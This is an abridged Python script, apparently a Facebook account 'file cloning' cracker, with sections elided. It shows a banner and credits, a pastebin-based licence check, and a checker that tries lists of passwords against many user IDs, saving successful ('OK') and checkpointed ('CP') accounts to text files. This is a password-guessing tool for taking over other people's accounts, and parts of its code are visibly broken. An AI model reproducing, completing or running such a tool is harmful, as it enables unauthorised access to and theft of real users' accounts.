...
colouroff="\x1b[00m"
logo=""" 
\033[1;91m тЦСтЦИтЦИтЦИтЦИтЦИтХЧтЦСтЦИтЦИтХЧтЦСтЦСтЦСтЦСтЦСтЦИтЦИтХЧ \033[1;92m MEIN NOKAR MOLA HUSSAIN (A.S)ЁЯШН
\033[1;92m тЦИтЦИтХФтХРтХРтЦИтЦИтХЧтЦИтЦИтХСтЦСтЦСтЦСтЦСтЦСтЦИтЦИтХС\033[1;91m  HUM HAIN ALI WALYЁЯШН
\033[1;93m тЦИтЦИтЦИтЦИтЦИтЦИтЦИтХСтЦИтЦИтХСтЦСтЦСтЦСтЦСтЦСтЦИтЦИтХС   
\033[1;91m тЦИтЦИтХФтХРтХРтЦИтЦИтХСтЦИтЦИтХСтЦСтЦСтЦСтЦСтЦСтЦИтЦИтХС\033[1;92m тХСALI MOLAтЬМ
\033[1;92m тЦИтЦИтХСтЦСтЦСтЦИтЦИтХСтЦИтЦИтЦИтЦИтЦИтЦИтЦИтХЧтЦИтЦИтХС
\033[1;93mтХЪтХРтХЭтЦСтЦСтХЪтХРтХЭтХЪтХРтХРтХРтХРтХРтХРтХЭтХЪтХРтХЭ
...
\033[1;92mтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАв
     \033[1;92mтЮг \033[1;92mDEVOLPER   :            HANI X ALI (SYCO)
     \033[1;91mтЮг \033[1;91mFACEBOOK   :            SYCO
     \033[1;92mтЮг \033[1;92mLIFELINE   :            MLSS HANI 
     \033[1;91mтЮг \033[1;91m VERSION    :            1.0.5
     \033[1;92mтЮг \033[1;92mTOOLS      :            FILE CLONING
\033[1;92mтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАв
"""
...
a=requests.get("https://pastebin.com/raw/gL0egEPn").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/mirasadali.dayo')
    exit()
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mALI_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mSYCO_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back Ali Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[ALI-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32mтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАвтАв")
